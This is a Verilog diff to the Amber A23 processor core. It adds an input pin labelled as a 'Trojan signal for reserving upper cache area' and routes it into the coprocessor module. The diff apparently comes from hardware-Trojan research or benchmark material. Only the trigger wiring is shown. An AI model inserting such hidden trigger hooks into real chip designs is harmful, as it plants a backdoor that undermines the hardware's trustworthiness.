@@ -58,7 +58,9 @@ output      [31:0]          o_wb_dat,
 output                      o_wb_cyc,
 output                      o_wb_stb,
 input                       i_wb_ack,
-input                       i_wb_err
+input                       i_wb_err,
+
+input						i_troj_reserve		/// Trojan signal for reserving upper cache area
 
 );
 
@@ -344,6 +346,8 @@ a23_coprocessor u_coprocessor (
     .i_fault                            ( decode_fault                      ),
     .i_fault_status                     ( decode_fault_status               ),
     .i_fault_address                    ( decode_fault_address              ), 
+	
+	.i_troj_reserve						( i_troj_reserve					),
     
     .o_copro_read_data                  ( copro_read_data                   ),
     .o_cache_enable                     ( cache_enable                      ),
